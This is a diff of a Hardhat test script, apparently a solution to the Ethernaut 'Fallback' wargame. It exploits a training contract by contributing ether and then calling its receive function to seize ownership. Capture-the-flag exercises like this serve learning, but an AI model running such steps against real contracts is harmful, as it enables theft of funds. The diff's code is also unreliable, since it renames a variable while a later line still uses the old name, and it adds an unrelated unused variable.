@@ -2,12 +2,8 @@ const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
 describe("Fallback Exploit using EOA", function () {
-  let fallbackContract,
-    attacker,
-    originalOwner,
-    contractAddress,
-    balance,
-    newOwner;
+  let fallbackContract, attacker, contractAddress, consecutiveWins;
+
   before("Setup for attack", async function () {
     [attacker] = await ethers.getSigners();
     contractAddress = "0x4c839930904B2149Dc5D28096034488e0B16c68F"; // insert contract address of ethernaut challenge
@@ -17,9 +13,10 @@ describe("Fallback Exploit using EOA", function () {
   it("perform exploit", async function () {
     // Attack flow
     // First we need to contribute to the fallback contract
-    let txContribute = await fallbackContract.contribute({
+    let txAttack = await fallbackContract.contribute({
       value: ethers.utils.parseEther(".00001"),
     });
+
     let contributeReceipt = await txContribute.wait();
 
     // Second we need to call the receive function to become the new owner
